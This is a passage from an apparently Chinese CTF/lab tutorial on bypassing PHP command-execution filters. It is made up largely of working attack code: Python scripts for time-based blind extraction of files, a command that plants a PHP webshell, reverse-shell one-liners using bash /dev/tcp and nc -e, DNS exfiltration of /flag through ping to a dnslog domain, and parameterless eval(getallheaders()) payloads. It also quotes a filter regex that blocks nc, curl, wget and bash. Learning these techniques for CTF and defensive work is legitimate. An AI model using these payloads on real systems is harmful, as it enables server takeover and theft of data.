class="string">&#x27;&gt;0.\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;4\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;8.\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;16\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;2.\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;19\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;\ \\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;rl\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;cu\\&#x27;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    url = baseurl+<span class="built_in">str</span>(i)</span><br><span class="line">    s.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    url = baseurl+<span class="built_in">str</span>(j)</span><br><span class="line">    s.get(url)</span><br><span class="line"></span><br><span class="line">s.get(baseurl+<span class="string">&quot;sh x&quot;</span>)</span><br><span class="line">s.get(baseurl+<span class="string">&quot;sh g&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cf4b5d1.png" alt="image-20240401090817745"></p>
<h3 id="3字符下可控"><a href="#3字符下可控" class="headerlink" title="3字符下可控"></a>3字符下可控</h3><p>CTFSHOW平台的【nl】难了 一题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])&lt;<span class="number">4</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;hack!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>只限3个字符的shell_exec，依然利用通配符 * 表示将ls下面的文件执行，如果第一个是命令就直接执行命令，后面的当参数，与前几点的原理类似</p>
<p>首先ls查看当前目录下有哪些文件  ?1&#x3D;ls</p>
<p>只存在s开头的和z开头的文件，Linux中文件排序按照26个英文字母顺序排放，所以我们依然利用前几种字符限制的方法，通过&gt;写入一个以命令名命名的文件，如:nl（读取文件带上行）od（八进制显示输出），但这样的命令前提是其第一个字母必须在当前文件名中排到第一位。</p>
<p>payload:<code>?1=&gt;nl ?1=*或?1=*&gt;z 第二种：?1=&gt;od ?1=*</code></p>
<p>接下来再传入?&#x3D;*的时候就会在源代码中得到flag。</p>
<h2 id="无回显RCE"><a href="#无回显RCE" class="headerlink" title="无回显RCE"></a>无回显RCE</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;<span class="subst">$a</span>&quot;</span>);</span><br><span class="line"><span class="comment">//$b=exec(&quot;$a&quot;);</span></span><br><span class="line"><span class="comment">//echo $b;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>命令执行函数我用的是<code>exec</code>,因为这个函数本身是没有回显的，拿来做测试简直不能再合适</p>
<h3 id="法1-3"><a href="#法1-3" class="headerlink" title="法1"></a>法1</h3><p>时间盲注</p>
<p>逻辑和SQL注入的时间盲注差不多</p>
<p>相关命令：<br>1.sleep<br>sleep 5       #5秒之后返回结果</p>
<p>2.awk：逐行获取数据</p>
<p><code>cat test.php | awk NR==2               //awk NR==2 逐行获取一行字符</code></p>
<p>3.cut -c<br>cut命令逐列获取单个字符<br><code>cat flag | awk NR==2  | cut -c 1      #获取第一个字符 cat flag | awk NR==2  | cut -c 2      #获取第二个字符</code></p>
<p>4、if语句：判断命令是否执行<br>if [ $(cat flag | awk NR&#x3D;&#x3D;2 | cut -c 1) &#x3D;&#x3D; F ];then sleep 2;fi<br>if里的判断语句为真的话，则执行sleep 2，休眠2秒后返回结果 </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161ce84d2d.png" alt="image-20240401093435071"></p>
<p>直接脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">可用</span></span><br><span class="line"><span class="string">环境搭建: 靶机:kali 192.168.40.148</span></span><br><span class="line"><span class="string">拉取镜像: docker pull mcc0624/cmd:latest</span></span><br><span class="line"><span class="string">启动docker: sudo docker run -p 18022:22 -p 18080:80 -p 18081:81 -p 18082:82 -p 18085 -i -t mcc0624/cmd:latest bash -c &#x27;/etc/rc.local; /bin/bash&#x27;</span></span><br><span class="line"><span class="string">退出并关闭docker:exit</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># url=input(&quot;请输入URL:,例如:http://192.168.40.148:18080/class08/1.php?cmd=&quot;)</span></span><br><span class="line">url=<span class="built_in">input</span>(<span class="string">&quot;URL样式:http://192.168.40.148:18080/class08/1.php?cmd=\n请输入URL:&quot;</span>)</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">55</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">            k = <span class="built_in">chr</span>(k)</span><br><span class="line">            <span class="comment"># time.sleep(0.1)</span></span><br><span class="line">            payload = <span class="string">f&quot;if [ `cat flag.php | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>` == <span class="subst">&#123;k&#125;</span> ];then sleep 2;fi&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url=url + payload, timeout=(<span class="number">1.5</span>, <span class="number">1.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result = result + k</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    result += <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url =<span class="string">&quot;http://192.168.1.6:19080/class08/1.php&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>): //定义i、j、k三个变量</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):  </span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):  //<span class="built_in">ascii</span>码表</span><br><span class="line">            k=<span class="built_in">chr</span>(k)  //把<span class="built_in">ascii</span>码转换成字母，HEX编码变成字符</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)  //i定义读取<span class="number">1</span>-<span class="number">5</span>行，i定义读取<span class="number">1</span>-<span class="number">55</span>个字符</span><br><span class="line">            payload = <span class="string">&quot;?cmd=&quot;</span> + <span class="string">f&quot;if[ `ls | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>`==<span class="subst">&#123;k&#125;</span>];then sleep 2;fi&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url=url+payload, timeout=(<span class="number">1.5</span>,<span class="number">1.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result = result + k   //把值加入result，<span class="built_in">print</span>输出显示</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    result += <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>两个脚本差不多</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161d0d0b65.png" alt="image-20240401092849763"></p>
<h3 id="法2-3"><a href="#法2-3" class="headerlink" title="法2"></a>法2</h3><p>文件读写</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls | tee abc</span><br></pre></td></tr></table></figure>

<p><code>tee</code>命令用于从标准输入读取数据，并将其写入一个或多个文件 tee的作用是把查询到的根目录写入到当前网页下的某文件 再次访问该文件即可得到被打印的根目录</p>
<p><code>tee</code>通常后面会跟着要写入的文件名</p>
<p>先执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=ls| tee abc # 将ls的结果重定向到文件名为abc的文件中</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161ce6fe16.png" alt="image-20240401094832958"></p>
<p>还可以：</p>
<p>重定向符 :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=echo &quot;&lt;?php show_source(__FILE__);@eval(\$_POST[&#x27;s&#x27;]); ?&gt;&quot; &gt; a.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cfd7e0d.png" alt="image-20240401095308316"></p>
<p>再访问a.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cdd1ee9.png" alt="image-20240401095338301"></p>
<p>然后就随便打了</p>
<h3 id="法3-1"><a href="#法3-1" class="headerlink" title="法3"></a>法3</h3><p>反弹shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;<span class="subst">$a</span>&quot;</span>);</span><br><span class="line"><span class="comment">//$b=exec(&quot;$a&quot;);</span></span><br><span class="line"><span class="comment">//echo $b;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>遇到这种无回显的命令执行，很常见的一个思路是反弹shell，因为它虽然不会将命令执行的结果输出在屏幕上，但实际上这个命令它是执行了的，那我们就将shell反弹到自己服务器上，然后再执行命令肯定就可以看到回显了</p>
<p>一般来讲我们反弹shell都用的<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>这条命令，但这里我不知道哪里出了问题，在docker中可以成功反弹但放到php命令执行中就反弹不了了，所以说无奈之下我就只能使用<code>nc</code>进行反弹，但其实这是很不实用的，因为很多docker中都没有安装<code>nc</code>，这里就先演示一下用<code>nc</code>反弹，利用<code>nc -e /bin/sh ip port</code>进行反弹：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161ce5cdba.png" alt="image-20240401211530764"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161d08ca11.png" alt="image-20240401211556638"></p>
<p>可以看到已经反弹成功了，拿到了根目录下的flag</p>
<h3 id="法4"><a href="#法4" class="headerlink" title="法4"></a>法4</h3><p>dnslog外带数据法</p>
<p><strong>DNS（域名解析）：</strong></p>
<blockquote>
<p>域名解析是把域名指向网站空间IP，让人们通过注册的域名可以方便地访问到网站的一种服务。IP地址是网络上标识站点的数字地址，为了方便记忆，采用域名来代替IP地址标识站点地址。域名解析就是域名到IP地址的转换过程。域名的解析工作由DNS服务器完成。</p>
<p>域名解析也叫域名指向、服务器设置、域名配置以及反向IP登记等等。说得简单点就是将好记的域名解析成IP，服务由DNS服务器完成，是把域名解析到一个IP地址，然后在此IP地址的主机上将一个子目录与域名绑定。</p>
</blockquote>
<p>而如果我们发起请求的目标不是IP地址而是域名的话，就一定会发生一次域名解析，那么假如我们有一个可控的二级域名，那么当它向下一层域名发起解析的时候，我们就能拿到它的域名解析请求。这就相当于配合dns请求完成对命令执行的判断，这就称之为dnslog。当然，发起一个dns请求需要通过linux中的<code>ping</code>命令或者<code>curl</code>命令哈</p>
<blockquote>
<p>DNSLOG平台 </p>
<p><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn</a>  （是临时的网址）</p>
<p><a target="_blank" rel="noopener" href="http://admin.dnslog.link/">http://admin.dnslog.link</a> （不常用了）</p>
<p><a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io</a> （要注册）</p>
</blockquote>
<p>也可以使用yakit的DNSLog:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cee4e55.png" alt="image-20240401212510959"></p>
<p>还是这一段代码，我们用分号<code>;</code>作为命令的分隔符，然后发起<code>curl</code>请求，然后最后用反引号执行命令，具体如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161ce6c83e.png" alt="image-20240401212125289"></p>
<p>然后就可以到ceye平台上取看到我们发起的请求了，可以看到<code>whoami</code>的结果也已经在上面显示了出来：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cd6cf42.png" alt="image-20240401212157348"></p>
<p>然后我们就尝试执行其它的命令比如像<code>ls</code>之类的，但这里需要注意的一点是，如果我们直接执行<code>ls</code>的话，它只会返回第一条结果,具体如下图所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cdafb7e.png" alt="image-20240401212217281"></p>
<p>那么为了让它显示出剩余的结果，我们就需要用到linux的<code>sed</code>命令，用<code>sed</code>命令就可以实现对行的完美划分，这里利用题目不是很好演示，我就直接用kali进行演示，就像下图一样直接用就行，还是很方便的：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cf9bdab.png" alt="image-20240401212241190"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=ping `ls|sed -n &#x27;1p&#x27;`.pmdbhelcqt.dgrh3.cn # 通过控制多少p,就可以看到ls出的第多少个文件名</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=ping `cat /flag`.pmdbhelcqt.dgrh3.cn</span><br></pre></td></tr></table></figure>



<p>这样就可以完成任意的命令执行了，但是值得注意的是，因为有的字符可能会无法显示或者只显示部分信息，所以说执行命令的时候推荐使用base64编码，然后再解开就好：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161ce7b2e9.png" alt="image-20240401212313639"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161ce45caa.png" alt="image-20240401212332680"></p>
<h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果</p>
<h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里的正则表达式 <code>[^\W]+\((?R)?\)</code> 匹配了一个或多个非标点符号字符（表示函数名），后跟一个括号（表示函数调用）。其中 (?R) 是递归引用，<strong>它只能匹配和替换嵌套的函数调用，而不能处理函数参数</strong>。使用该正则表达式进行替换后，每个函数调用都会被删除，只剩下一个分号 ;，而最终结果强等于；时，payload才能进行下一步。简而言之，<strong>无参数rce就是不使用参数，而只使用一个个函数最终达到目的</strong>。</p>
</blockquote>
<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>无参数rce可能用到的函数:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目录操作：</span><br><span class="line">getchwd() ：函数返回当前工作目录。</span><br><span class="line">scandir() ：函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() ：函数返回路径中的目录部分。</span><br><span class="line">chdir() ：函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">数组相关的操作：</span><br><span class="line">end() - 将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">next() - 将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">prev() - 将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line">reset() - 将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line">each() - 返回当前元素的键名和键值，并将内部指针向前移动。</span><br><span class="line">array_shift() - 删除数组中第一个元素，并返回被删除元素的值。</span><br><span class="line">array_reverse() -逆转数组</span><br><span class="line">array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。</span><br><span class="line">array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，                         array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完               成后，就可以根据随机的键获取数组的随机值。</span><br><span class="line"> array_flip()和array_rand()配合使用可随机返回当前目录下的文件名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">读文件</span><br><span class="line">show_source() - 对文件进行语法高亮显示。</span><br><span class="line">readfile() - 输出一个文件。</span><br><span class="line">highlight_file() - 对文件进行语法高亮显示。</span><br><span class="line">file_get_contents() - 把整个文件读入一个字符串中。</span><br><span class="line">readgzfile() - 可用于读取非 gzip 格式的文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">关键函数：</span><br><span class="line">getenv() ：获取环境变量的值  </span><br><span class="line">           php7.0以下返回bool(false)</span><br><span class="line">           php7.0以上正常回显</span><br><span class="line">           payload:</span><br><span class="line">           ?code=var_dump(getenv());</span><br><span class="line">           ?code=var_dump(getenv(phpinfo()));</span><br><span class="line">           </span><br><span class="line">           </span><br><span class="line">           </span><br><span class="line">getallheaders()：获取所有 HTTP 请求标头，是apache_request_headers()的别名函                    数，但是该函数只能在Apache环境下使用</span><br><span class="line"></span><br><span class="line">                  payload:</span><br><span class="line">                  1) GET /1.php?code=eval(end(getallheaders()));                              HTTP/1.1</span><br><span class="line">                     .....</span><br><span class="line">                     flag: system(&#x27;id&#x27;);</span><br><span class="line">                  2) GET /1.php?exp=eval(end(apache_request_headers()));                      HTTP/1.1</span><br><span class="line">                     ....</span><br><span class="line">                     flag: system(&#x27;id&#x27;);      php7以上</span><br><span class="line">                    </span><br><span class="line">                     </span><br><span class="line">                     </span><br><span class="line">get_defined_vars()：返回由所有已定义变量所组成的数组，会返回$_GET</span><br><span class="line">                   ,$_POST,$_COOKIE,$_FILES全局变量的值，返回数组顺序为get-                       &gt;post-&gt;cookie-&gt;files</span><br><span class="line">           current()：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也                        就是会返回$_GET变量的数组值</span><br><span class="line">          payload:</span><br><span class="line">          1） code=eval(end(current(get_defined_vars())));</span><br><span class="line">              &amp;flag=system(&#x27;ls&#x27;);    利用全局变量进RCE</span><br><span class="line">          2）flag=system(&#x27;id&#x27;);&amp;code=eval(pos(pos(get_defined_vars())));</span><br><span class="line">           </span><br><span class="line">           pos() 函数返回数组中的当前元素的值。</span><br><span class="line"></span><br><span class="line">           该函数是 current() 函数的别名。</span><br><span class="line">                  </span><br><span class="line">                  </span><br><span class="line">                 </span><br><span class="line">session_start()：启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回                      FALSE,返回参数给session_id()</span><br><span class="line">session_id()：获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符               串（””）</span><br><span class="line">scandir()  文件读取</span><br></pre></td></tr></table></figure>





<h4 id="法1-4"><a href="#法1-4" class="headerlink" title="法1"></a>法1</h4><p><strong>getallheaders()</strong></p>
<p>这个函数的作用是获取http所有的头部信息，也就是headers，然后我们可以用var_dump把它打印出来，但这个有个限制条件就是必须在apache的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;please input code&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161d16d995.png" alt="image-20240401220518864"></p>
<p>可以看到，所有的头部信息都已经作为了一个数组打印了出来。但我们在实际的利用过程中并用不了这么多的，我们需要有选择的执行一些命令，这里就需要用到php中操纵数组的函数了，这里常见的是利用end()函数取出最后一位，并且只会取值，不会取键，所以键名随便取：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161d11991a.png" alt="image-20240401220554490"></p>
<p>结合上面一些其他相关函数</p>
<p>即可实现命令执行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161d22e250.png" alt="image-20240401221109115"></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(array_rand(array_flip(getallheaders())));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(end(getallheaders()))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(pos(array_reverse(getallheaders())))</span><br></pre></td></tr></table></figure>

<p>都要传header</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cdd0404.png" alt="image-20240401221541707"></p>
<h4 id="法2-4"><a href="#法2-4" class="headerlink" title="法2"></a>法2</h4><p>get_defined_vars()</p>
